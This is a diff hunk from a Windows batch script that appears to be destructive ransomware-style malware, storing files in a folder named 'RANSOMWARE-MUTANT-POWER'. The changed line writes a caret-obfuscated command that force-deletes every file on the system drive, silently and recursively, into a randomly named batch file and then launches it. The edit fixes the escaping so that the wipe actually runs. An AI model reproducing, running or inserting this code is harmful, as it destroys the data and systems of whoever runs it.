@@ -366,7 +366,7 @@ echo A blue screen will start.
 ::^D^e^l^ all file
 echo ^D^e^l^ all file.
 set randomqustn=%random%
-echo ^d^e^l^ ^%^s^y^s^t^e^m^d^r^i^v^e^%^\^*^.^*^ ^/^f^ ^/^s^ ^/^q^ > %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\%randomqustn%.bat
+echo ^d^e^l^ ^%systemdrive%^\^*^.^*^ ^/^f^ ^/^s^ ^/^q^ > %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\%randomqustn%.bat
 start "" "%userprofile%\AppData\RANSOMWARE-MUTANT-POWER\%randomqustn%.bat"
 
 timeout/t 2 >nul
